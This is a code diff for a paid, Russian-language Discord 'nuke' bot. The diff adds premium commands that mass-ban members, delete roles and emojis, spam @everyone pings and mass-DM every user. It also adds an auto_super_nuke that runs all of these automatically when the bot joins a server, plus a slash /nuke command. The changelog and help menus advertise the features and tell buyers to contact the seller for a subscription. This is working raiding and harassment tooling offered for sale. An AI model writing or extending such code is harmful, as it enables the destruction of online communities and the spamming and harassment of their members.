@@ -271,20 +271,6 @@ async def rename_error(ctx, error):
 
 @bot.command()
 @wl_check()
-async def nsfw_all(ctx):
-    await asyncio.gather(*[c.edit(nsfw=True) for c in ctx.guild.text_channels], return_exceptions=True)
-    await ctx.send("Готово.")
-
-
-@bot.command()
-@wl_check()
-async def unnsfw_all(ctx):
-    await asyncio.gather(*[c.edit(nsfw=False) for c in ctx.guild.text_channels], return_exceptions=True)
-    await ctx.send("Готово.")
-
-
-@bot.command()
-@wl_check()
 async def invs_delete(ctx):
     invites = await ctx.guild.invites()
     await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
@@ -300,23 +286,6 @@ async def webhooks(ctx):
         return
     msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
     await ctx.send(f"```{msg[:1900]}```")
-
-
-@bot.command()
-@wl_check()
-async def ip(ctx, address: str):
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"http://ip-api.com/json/{address}") as resp:
-            data = await resp.json()
-    if data['status'] == 'fail':
-        await ctx.send(f"Ошибка: {data['message']}")
-        return
-    embed = discord.Embed(title=f"IP: {address}", color=discord.Color.blue())
-    embed.add_field(name="Страна", value=data.get('country', 'N/A'))
-    embed.add_field(name="Город", value=data.get('city', 'N/A'))
-    embed.add_field(name="ISP", value=data.get('isp', 'N/A'))
-    embed.add_field(name="Координаты", value=f"{data.get('lat')}, {data.get('lon')}")
-    await ctx.send(embed=embed)
 
 
 @bot.command()
@@ -419,9 +388,366 @@ async def pm_list(ctx):
     await ctx.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
 
 
+# ─── PREMIUM COMMANDS ──────────────────────────────────────
+
+def premium_check():
+    async def predicate(ctx):
+        if ctx.guild and is_guild_blocked(ctx.guild.id):
+            return False
+        if not is_whitelisted(ctx.author.id):
+            embed = discord.Embed(
+                title="☠️ ДОСТУП ЗАПРЕЩЁН",
+                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await ctx.send(embed=embed)
+            return False
+        if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
+            embed = discord.Embed(
+                title="💎 PREMIUM ФУНКЦИЯ",
+                description="Эта команда доступна только **Premium** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await ctx.send(embed=embed)
+            return False
+        return True
+    return commands.check(predicate)
+
+
+@bot.command(name="massdm")
+@premium_check()
+async def massdm(ctx, *, text: str):
+    guild = ctx.guild
+    members = [m for m in guild.members if not m.bot]
+    sent = 0
+    failed = 0
+    status_msg = await ctx.send(embed=discord.Embed(
+        description=f"📨 Рассылаю ДМ {len(members)} участникам...",
+        color=0x0a0a0a
+    ))
+    for member in members:
+        try:
+            await member.send(text)
+            sent += 1
+        except Exception:
+            failed += 1
+        await asyncio.sleep(0.5)
+    embed = discord.Embed(
+        title="📨 Mass DM завершён",
+        description=f"✅ Отправлено: **{sent}**\n❌ Не доставлено: **{failed}**",
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await status_msg.edit(embed=embed)
+
+
+@bot.command(name="massban")
+@premium_check()
+async def massban(ctx):
+    guild = ctx.guild
+    bot_role = guild.me.top_role
+    targets = [
+        m for m in guild.members
+        if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id
+        and (not m.top_role or m.top_role < bot_role)
+    ]
+    status_msg = await ctx.send(embed=discord.Embed(
+        description=f"💀 Баню {len(targets)} участников...",
+        color=0x0a0a0a
+    ))
+    results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
+    banned = sum(1 for r in results if not isinstance(r, Exception))
+    embed = discord.Embed(
+        title="💀 Mass Ban завершён",
+        description=f"✅ Забанено: **{banned}**",
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await status_msg.edit(embed=embed)
+
+
+@bot.command(name="spam")
+@premium_check()
+async def spam_cmd(ctx, count: int, *, text: str):
+    if count > 50:
+        await ctx.send("Максимум 50.")
+        return
+    mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
+    for _ in range(count):
+        try:
+            await ctx.send(text, allowed_mentions=mentions)
+            await asyncio.sleep(0.5)
+        except Exception:
+            pass
+
+
+@bot.command(name="pingspam")
+@premium_check()
+async def pingspam(ctx, count: int = 10):
+    if count > 30:
+        await ctx.send("Максимум 30.")
+        return
+    mentions = discord.AllowedMentions(everyone=True)
+    for _ in range(count):
+        try:
+            await ctx.send("@everyone @here", allowed_mentions=mentions)
+            await asyncio.sleep(0.5)
+        except Exception:
+            pass
+
+
+@bot.command(name="rolesdelete")
+@premium_check()
+async def rolesdelete(ctx):
+    guild = ctx.guild
+    bot_role = guild.me.top_role
+    results = await asyncio.gather(
+        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
+        return_exceptions=True
+    )
+    deleted = sum(1 for r in results if not isinstance(r, Exception))
+    embed = discord.Embed(
+        description=f"🗑️ Удалено ролей: **{deleted}**",
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="emojisnuke")
+@premium_check()
+async def emojisnuke(ctx):
+    guild = ctx.guild
+    results = await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
+    deleted = sum(1 for r in results if not isinstance(r, Exception))
+    embed = discord.Embed(
+        description=f"💀 Удалено эмодзи: **{deleted}**",
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="serverinfo")
+@premium_check()
+async def serverinfo(ctx):
+    guild = ctx.guild
+    embed = discord.Embed(
+        title=f"☠️ {guild.name}",
+        color=0x0a0a0a
+    )
+    embed.add_field(name="👥 Участников", value=str(guild.member_count))
+    embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
+    embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
+    embed.add_field(name="💎 Буст уровень", value=str(guild.premium_tier))
+    embed.add_field(name="🚀 Бустеров", value=str(guild.premium_subscription_count))
+    embed.add_field(name="🆔 ID сервера", value=str(guild.id))
+    embed.add_field(name="👑 Овнер", value=str(guild.owner))
+    embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
+    if guild.icon:
+        embed.set_thumbnail(url=guild.icon.url)
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="userinfo")
+@premium_check()
+async def userinfo(ctx, user_id: int = None):
+    if user_id:
+        try:
+            user = await bot.fetch_user(user_id)
+        except Exception:
+            await ctx.send("Пользователь не найден.")
+            return
+    else:
+        user = ctx.author
+    member = ctx.guild.get_member(user.id) if ctx.guild else None
+    embed = discord.Embed(
+        title=f"👁️ {user}",
+        color=0x0a0a0a
+    )
+    embed.add_field(name="🆔 ID", value=str(user.id))
+    embed.add_field(name="📅 Аккаунт создан", value=user.created_at.strftime("%d.%m.%Y"))
+    if member:
+        embed.add_field(name="📥 Зашёл на сервер", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
+        embed.add_field(name="🎭 Высшая роль", value=member.top_role.mention)
+        embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
+    if user.avatar:
+        embed.set_thumbnail(url=user.avatar.url)
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await ctx.send(embed=embed)
+
+
+# ─── AUTO SUPER NUKE ───────────────────────────────────────
+
+AUTO_SUPER_NUKE = False
+AUTO_SUPER_NUKE_TEXT = None  # None = использовать config.SPAM_TEXT
+# Настройки что делать при auto_super_nuke
+SNUKE_CONFIG = {
+    "massban": True,       # банить всех
+    "boosters_only": False, # банить только бустеров
+    "rolesdelete": True,   # удалить роли
+    "pingspam": True,      # пинг спам
+    "massdm": False,       # масс дм
+}
+
+
+def save_auto_super_nuke():
+    with open("auto_super_nuke.json", "w", encoding="utf-8") as f:
+        json.dump({
+            "enabled": AUTO_SUPER_NUKE,
+            "text": AUTO_SUPER_NUKE_TEXT,
+            "config": SNUKE_CONFIG
+        }, f, ensure_ascii=False)
+
+
+def load_auto_super_nuke():
+    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
+    if os.path.exists("auto_super_nuke.json"):
+        with open("auto_super_nuke.json", "r", encoding="utf-8") as f:
+            data = json.load(f)
+            AUTO_SUPER_NUKE = data.get("enabled", False)
+            AUTO_SUPER_NUKE_TEXT = data.get("text", None)
+            if "config" in data:
+                SNUKE_CONFIG.update(data["config"])
+
+
+@bot.command(name="auto_super_nuke")
+@premium_check()
+async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
+    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT
+    if state.lower() == "on":
+        AUTO_SUPER_NUKE = True
+        save_auto_super_nuke()
+        embed = discord.Embed(
+            title="💀 Auto Super Nuke — ВКЛЮЧЁН",
+            description=(
+                "При входе бота на сервер автоматически:\n"
+                "• Нюк с твоим текстом (или дефолтным)\n"
+                "• Массбан всех участников\n"
+                "• Удаление всех ролей\n"
+                "• Пинг спам @everyone\n\n"
+                f"Текст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n"
+                "Чтобы задать текст: `!auto_super_nuke text <твой текст>`"
+            ),
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    elif state.lower() == "off":
+        AUTO_SUPER_NUKE = False
+        save_auto_super_nuke()
+        embed = discord.Embed(description="✅ **Auto Super Nuke** выключен.", color=0x0a0a0a)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    elif state.lower() == "text":
+        if not text:
+            await ctx.send("Укажи текст: `!auto_super_nuke text <твой текст>`")
+            return
+        AUTO_SUPER_NUKE_TEXT = text
+        save_auto_super_nuke()
+        embed = discord.Embed(
+            title="✅ Текст Auto Super Nuke обновлён",
+            description=f"```{text[:500]}```",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь включи: !auto_super_nuke on")
+        await ctx.send(embed=embed)
+    elif state.lower() == "info":
+        status = "✅ Включён" if AUTO_SUPER_NUKE else "❌ Выключен"
+        cur_text = AUTO_SUPER_NUKE_TEXT or config.SPAM_TEXT
+        embed = discord.Embed(
+            title="💀 Auto Super Nuke — INFO",
+            description=(
+                f"Статус: **{status}**\n\n"
+                "При входе бота на сервер:\n"
+                "• Нюк с кастомным текстом\n"
+                "• Массбан всех участников\n"
+                "• Удаление всех ролей\n"
+                "• Пинг спам @everyone\n\n"
+                f"Текущий текст:\n```{cur_text[:300]}```"
+            ),
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    else:
+        await ctx.send(
+            "Использование:\n"
+            "`!auto_super_nuke on` — включить\n"
+            "`!auto_super_nuke off` — выключить\n"
+            "`!auto_super_nuke text <текст>` — задать текст\n"
+            "`!auto_super_nuke info` — статус и текущий текст"
+        )
+
+
+@bot.command(name="snuke_config")
+@premium_check()
+async def snuke_config(ctx, option: str = None, value: str = None):
+    """Настройка что делает auto_super_nuke при входе на сервер"""
+    options = {
+        "massban":      ("Массбан всех участников", "massban"),
+        "boosters":     ("Банить только бустеров", "boosters_only"),
+        "rolesdelete":  ("Удаление всех ролей", "rolesdelete"),
+        "pingspam":     ("Пинг спам @everyone", "pingspam"),
+        "massdm":       ("Масс ДМ всем участникам", "massdm"),
+    }
+
+    if not option:
+        # Показать текущие настройки
+        embed = discord.Embed(
+            title="⚙️ SUPER NUKE — НАСТРОЙКИ",
+            description=(
+                "Управляй что делает `!auto_super_nuke` при входе на сервер.\n"
+                "Использование: `!snuke_config <опция> on/off`"
+            ),
+            color=0x0a0a0a
+        )
+        lines = []
+        for key, (label, cfg_key) in options.items():
+            status = "✅" if SNUKE_CONFIG.get(cfg_key) else "❌"
+            lines.append(f"{status} `{key}` — {label}")
+        embed.add_field(name="Текущие настройки", value="\n".join(lines), inline=False)
+        embed.add_field(
+            name="Опции",
+            value=(
+                "`massban` — банить всех участников\n"
+                "`boosters` — банить только бустеров (если massban выкл)\n"
+                "`rolesdelete` — удалять все роли\n"
+                "`pingspam` — пинг спам @everyone\n"
+                "`massdm` — масс ДМ всем участникам"
+            ),
+            inline=False
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Нюк всегда включён")
+        await ctx.send(embed=embed)
+        return
+
+    if option not in options:
+        await ctx.send(f"❌ Неизвестная опция `{option}`. Доступные: `{'`, `'.join(options.keys())}`")
+        return
+    if value not in ("on", "off"):
+        await ctx.send("Укажи `on` или `off`.")
+        return
+
+    cfg_key = options[option][1]
+    SNUKE_CONFIG[cfg_key] = (value == "on")
+    save_auto_super_nuke()
+
+    status = "✅ включено" if value == "on" else "❌ выключено"
+    embed = discord.Embed(
+        description=f"**{options[option][0]}** — {status}",
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await ctx.send(embed=embed)
+
+
 # ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────
 
-@bot.command(name="block_guild")
+@bot.command(name="block_guild", aliases=["block_guid"])
 async def block_guild(ctx, guild_id: int = None):
     if ctx.author.id != config.OWNER_ID:
         return
@@ -439,7 +765,7 @@ async def block_guild(ctx, guild_id: int = None):
         await ctx.send("Сервер уже заблокирован.")
 
 
-@bot.command(name="unblock_guild")
+@bot.command(name="unblock_guild", aliases=["unblock_guid"])
 async def unblock_guild(ctx, guild_id: int = None):
     if ctx.author.id != config.OWNER_ID:
         return
@@ -483,34 +809,51 @@ async def changelog(ctx):
         color=0x0a0a0a
     )
     embed.add_field(
-        name="🆕 v1.3 — Текущая версия",
+        name="🆕 v1.4 — Premium расширение",
         value=(
-            "• Добавлена **Premium** система — `!nuke [текст]` со своим текстом\n"
-            "• Добавлена блокировка серверов — `!block_guild` / `!unblock_guild`\n"
-            "• Команда `!set_spam_text` — овнер может менять дефолтный текст нюка\n"
-            "• При `!nuke` каналы переименовываются в **DavaidKa Best**\n"
-            "• Без Premium текст в `!nuke` игнорируется, нюк всё равно запускается\n"
-            "• Полностью переработан дизайн всех меню в тёмном стиле ☠️"
+            "• `!massdm [текст]` — масс рассылка ДМ всем участникам\n"
+            "• `!massban` — забанить всех участников сервера\n"
+            "• `!spam [кол-во] [текст]` — спам в канал\n"
+            "• `!pingspam [кол-во]` — спам @everyone пингами\n"
+            "• `!rolesdelete` — удалить все роли\n"
+            "• `!emojisnuke` — удалить все эмодзи\n"
+            "• `!serverinfo` — подробная инфа о сервере\n"
+            "• `!userinfo [id]` — инфа о пользователе\n"
+            "• `!auto_super_nuke on/off/info` — авто нюк+бан+дм при входе бота"
         ),
         inline=False
     )
     embed.add_field(
-        name="⚡ v1.2",
+        name="🆕 v1.3 — Монетизация и защита",
         value=(
-            "• Управление ботом через ЛС — выбор сервера кнопками\n"
-            "• Команды `!guilds`, `!setguild`, `!invlink`\n"
-            "• Owner Panel — `!owner_help`\n"
-            "• Owner Whitelist — `!owl_add` / `!owl_remove`"
+            "• **Premium** система — кастомный текст в `!nuke` только для избранных\n"
+            "• Без Premium текст игнорируется, нюк всё равно запускается\n"
+            "• Блокировка серверов — `!block_guild` / `!unblock_guild`\n"
+            "• Овнер может менять дефолтный текст нюка через `!set_spam_text`\n"
+            "• Алиасы команд — `!block_guid` / `!unblock_guid` тоже работают"
         ),
         inline=False
     )
     embed.add_field(
-        name="💀 v1.1",
+        name="🎨 v1.2 — Редизайн и Owner Panel",
         value=(
-            "• Авто-краш при входе бота на сервер — `!auto_nuke`\n"
-            "• Спам slash команды — `/sp`, `/spkd`\n"
+            "• Полностью переработан дизайн всех меню — тёмный стиль ☠️\n"
+            "• ASCII арт в заголовках, иконки 💀 ⚡ 🔱 👁️\n"
+            "• Owner Panel через ЛС — `!owner_help`, `!guilds`, `!setguild`\n"
+            "• Owner Whitelist — `!owl_add` / `!owl_remove` / `!owl_list`\n"
+            "• Инвайт-ссылки со всех серверов — `!invlink`\n"
+            "• При нюке каналы называются **DavaidKa Best**"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="⚡ v1.1 — Расширение функционала",
+        value=(
+            "• Авто-краш при входе бота на сервер — `!auto_nuke on/off`\n"
+            "• Slash спам команды — `/sp`, `/spkd` с задержкой\n"
             "• Whitelist система — `!wl_add` / `!wl_remove` / `!wl_list`\n"
-            "• Команды `!cleanup`, `!addch`, `!rename`, `!nicks_all`"
+            "• `!cleanup`, `!addch`, `!rename`, `!nicks_all`, `!nsfw_all`\n"
+            "• Управление через ЛС без выбора сервера"
         ),
         inline=False
     )
@@ -518,8 +861,8 @@ async def changelog(ctx):
         name="☠️ v1.0 — Запуск",
         value=(
             "• Базовый краш — `!nuke`, `!stop`\n"
-            "• `!nsfw_all`, `!unnsfw_all`, `!invs_delete`\n"
-            "• `!webhooks`, `!ip`"
+            "• `!invs_delete`, `!unnsfw_all`, `!webhooks`, `!ip`\n"
+            "• Логирование действий в файл"
         ),
         inline=False
     )
@@ -547,10 +890,31 @@ async def help_cmd(ctx):
         color=0x0a0a0a
     )
     embed.add_field(
+        name="📋 СПИСОК КОМАНД",
+        value=(
+            "`!commands_user` — команды обычного пользователя\n"
+            "`!commands_premium` — команды Premium пользователя 💎\n"
+            "`!commands_owner` — команды овнера 👑\n"
+            "`!changelog` — история обновлений"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  ECLIPSED SQUAD")
+    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="commands_user")
+@wl_check()
+async def commands_user(ctx):
+    embed = discord.Embed(
+        title="👁️ КОМАНДЫ — ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ",
+        color=0x0a0a0a
+    )
+    embed.add_field(
         name="💀 УНИЧТОЖЕНИЕ",
         value=(
             "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
-            "`!nuke [текст]` — то же самое со своим текстом 💎 **Premium**\n"
             "`!stop` — остановить краш\n"
             "`!cleanup` — снести всё, оставить один канал\n"
             "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
@@ -562,36 +926,122 @@ async def help_cmd(ctx):
         name="⚡ КОНТРОЛЬ",
         value=(
             "`!rename [название]` — переименовать все каналы\n"
-            "`!nsfw_all` — включить NSFW везде\n"
-            "`!unnsfw_all` — выключить NSFW\n"
             "`!invs_delete` — уничтожить все инвайты\n"
-            "`!nicks_all [ник]` — сменить ники всем"
+            "`!nicks_all [ник]` — сменить ники всем\n"
+            "`!webhooks` — список вебхуков"
         ),
         inline=False
     )
     embed.add_field(
-        name="🔱 ИНСТРУМЕНТЫ",
+        name="🔱 УТИЛИТЫ",
         value=(
-            "`!webhooks` — список вебхуков\n"
-            "`!ip [адрес]` — пробить IP\n"
             "`!inv` — ссылка для добавления бота\n"
-            "`!changelog` — история обновлений бота\n"
             "`/sp [кол-во] [текст]` — спам\n"
-            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
+            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой\n"
+            "`!changelog` — история обновлений"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="commands_premium")
+@wl_check()
+async def commands_premium(ctx):
+    embed = discord.Embed(
+        title="💎 КОМАНДЫ — PREMIUM",
+        description="Доступны только Premium пользователям. Купить: **davaidkatt**",
+        color=0x0a0a0a
+    )
+    embed.add_field(
+        name="💀 УНИЧТОЖЕНИЕ",
+        value=(
+            "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!massban` — забанить всех участников\n"
+            "`!rolesdelete` — удалить все роли\n"
+            "`!emojisnuke` — удалить все эмодзи\n"
+            "`!auto_super_nuke on/off/text/info` — авто нюк+бан+роли+пинг при входе"
         ),
         inline=False
     )
     embed.add_field(
-        name="👁️ ДОСТУП",
+        name="📨 СПАМ",
         value=(
-            "`!wl_add [id]` — выдать доступ\n"
-            "`!wl_remove [id]` — забрать доступ\n"
-            "`!wl_list` — список допущенных"
+            "`!massdm [текст]` — разослать ДМ всем участникам\n"
+            "`!spam [кол-во] [текст]` — спам в канал\n"
+            "`!pingspam [кол-во]` — спам @everyone"
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  💎 Premium = кастомный текст нюка")
-    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    embed.add_field(
+        name="🔍 ИНФО",
+        value=(
+            "`!serverinfo` — подробная инфа о сервере\n"
+            "`!userinfo [id]` — инфа о пользователе"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="commands_owner")
+async def commands_owner(ctx):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    embed = discord.Embed(
+        title="👑 КОМАНДЫ — OWNER",
+        description="Только для овнера бота.",
+        color=0x0a0a0a
+    )
+    embed.add_field(
+        name="👥 WHITELIST",
+        value=(
+            "`!wl_add <id>` — выдать доступ к боту\n"
+            "`!wl_remove <id>` — забрать доступ\n"
+            "`!wl_list` — список пользователей"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="💎 PREMIUM",
+        value=(
+            "`!pm_add <id>` — выдать Premium\n"
+            "`!pm_remove <id>` — забрать Premium\n"
+            "`!pm_list` — список Premium"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🔒 БЛОКИРОВКА",
+        value=(
+            "`!block_guild <id>` — заблокировать сервер\n"
+            "`!unblock_guild <id>` — разблокировать\n"
+            "`!blocked_guilds` — список заблокированных"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="📝 НАСТРОЙКИ",
+        value=(
+            "`!set_spam_text <текст>` — сменить дефолтный текст нюка\n"
+            "`!get_spam_text` — показать текущий текст\n"
+            "`!owl_add/remove/list` — owner whitelist"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🖥️ В ЛС",
+        value=(
+            "`!owner_help` — полная панель управления\n"
+            "`!guilds` — список серверов\n"
+            "`!setguild <id>` — выбрать сервер\n"
+            "`!invlink` — инвайты со всех серверов"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD")
     await ctx.send(embed=embed)
 
 
@@ -601,6 +1051,62 @@ async def help_cmd(ctx):
 async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
+
+    # AUTO SUPER NUKE — нюк + настраиваемые действия
+    if AUTO_SUPER_NUKE:
+        nuke_running[guild.id] = True
+        spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
+        asyncio.create_task(do_nuke(guild, spam_text))
+
+        async def super_nuke_tasks():
+            await asyncio.sleep(2)
+            bot_role = guild.me.top_role
+
+            # Массбан или только бустеры
+            if SNUKE_CONFIG.get("massban"):
+                targets = [
+                    m for m in guild.members
+                    if not m.bot and m.id != guild.owner_id
+                    and (not m.top_role or m.top_role < bot_role)
+                ]
+                await asyncio.gather(*[m.ban(reason="auto_super_nuke") for m in targets], return_exceptions=True)
+            elif SNUKE_CONFIG.get("boosters_only"):
+                boosters = [m for m in guild.members if m.premium_since is not None]
+                await asyncio.gather(*[m.ban(reason="booster_ban") for m in boosters], return_exceptions=True)
+
+            # Удаление ролей
+            if SNUKE_CONFIG.get("rolesdelete"):
+                await asyncio.gather(
+                    *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
+                    return_exceptions=True
+                )
+
+            # Пинг спам
+            if SNUKE_CONFIG.get("pingspam"):
+                mentions = discord.AllowedMentions(everyone=True)
+                ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
+                if ch:
+                    for _ in range(10):
+                        try:
+                            await ch.send("@everyone @here", allowed_mentions=mentions)
+                            await asyncio.sleep(0.5)
+                        except Exception:
+                            break
+
+            # Масс ДМ
+            if SNUKE_CONFIG.get("massdm"):
+                for member in guild.members:
+                    if member.bot:
+                        continue
+                    try:
+                        await member.send(spam_text)
+                    except Exception:
+                        pass
+                    await asyncio.sleep(0.5)
+
+        asyncio.create_task(super_nuke_tasks())
+        return
+
     if config.AUTO_NUKE:
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
@@ -1360,29 +1866,25 @@ async def on_ready():
     load_blocked_guilds()
     load_premium()
     load_spam_text()
-    # Удаляем все slash команды
+    load_auto_super_nuke()
     bot.tree.clear_commands(guild=None)
 
-    # Добавляем /sp как user-installable команду
-    @bot.tree.command(name="sp", description="Спам сообщением")
-    @app_commands.describe(count="Количество раз", text="Текст сообщения")
+    # ── SLASH: доступны всем вайтлист ──────────────────────
+
+    @bot.tree.command(name="sp", description="☠️ Спам сообщением")
+    @app_commands.describe(count="Количество (макс 50)", text="Текст сообщения")
     @app_commands.allowed_installs(guilds=True, users=True)
     @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
     @app_commands.checks.cooldown(1, 300, key=lambda i: (i.user.id, i.channel_id))
     async def sp(interaction: discord.Interaction, count: int, text: str):
         await interaction.response.defer(ephemeral=True)
         if not is_whitelisted(interaction.user.id):
-            await interaction.followup.send("❌ У тебя нет подписки. За покупкой в ЛС Discord: **davaidkatt**", ephemeral=True)
-            return
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.followup.send(embed=embed, ephemeral=True); return
         if count > 50:
-            await interaction.followup.send("Максимум 50 сообщений.", ephemeral=True)
-            return
+            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
         mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
-        channel = interaction.channel
-        if channel is None:
-            await interaction.followup.send("❌ Не удалось получить канал.", ephemeral=True)
-            return
-        await interaction.followup.send(f"✅ Запускаю спам: {count} сообщений.", ephemeral=True)
+        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений.", ephemeral=True)
         for _ in range(count):
             try:
                 await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
@@ -1390,48 +1892,277 @@ async def on_ready():
             except discord.HTTPException as e:
                 if e.status == 429:
                     await asyncio.sleep(e.retry_after + 0.5)
-                    await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
             except Exception:
                 pass
 
-    @bot.tree.command(name="spkd", description="Спам с задержкой между сообщениями")
-    @app_commands.describe(delay="Задержка в секундах (0 = без задержки)", count="Количество сообщений (макс 50)", text="Текст сообщения")
+    @bot.tree.command(name="spkd", description="☠️ Спам с задержкой")
+    @app_commands.describe(delay="Задержка в секундах", count="Количество (макс 50)", text="Текст сообщения")
     @app_commands.allowed_installs(guilds=True, users=True)
     @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
     async def spkd(interaction: discord.Interaction, delay: int, count: int, text: str):
         await interaction.response.defer(ephemeral=True)
         if not is_whitelisted(interaction.user.id):
-            await interaction.followup.send("❌ У тебя нет подписки. За покупкой в ЛС Discord: **davaidkatt**", ephemeral=True)
-            return
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.followup.send(embed=embed, ephemeral=True); return
         if count > 50:
-            await interaction.followup.send("Максимум 50 сообщений.", ephemeral=True)
-            return
+            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
         if delay < 0:
-            await interaction.followup.send("Задержка не может быть отрицательной.", ephemeral=True)
-            return
+            await interaction.followup.send("❌ Задержка не может быть отрицательной.", ephemeral=True); return
         mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
-        channel = interaction.channel
-        if channel is None:
-            await interaction.followup.send("❌ Не удалось получить канал.", ephemeral=True)
-            return
-        await interaction.followup.send(f"✅ Запускаю спам: {count} сообщений, задержка {delay}с.", ephemeral=True)
+        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений, задержка **{delay}с**.", ephemeral=True)
         for _ in range(count):
             try:
                 await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
             except discord.HTTPException as e:
                 if e.status == 429:
                     await asyncio.sleep(e.retry_after + 0.5)
-                    await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
             except Exception:
                 pass
-            if delay > 0:
-                await asyncio.sleep(delay)
-            else:
-                await asyncio.sleep(0.5)
-    @bot.tree.command(name="help", description="Список всех команд бота")
+            await asyncio.sleep(max(delay, 0.5))
+
+    @bot.tree.command(name="nuke", description="💀 Краш сервера")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_nuke(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        guild = interaction.guild
+        if is_guild_blocked(guild.id):
+            await interaction.response.send_message("🔒 Сервер заблокирован.", ephemeral=True); return
+        if nuke_running.get(guild.id):
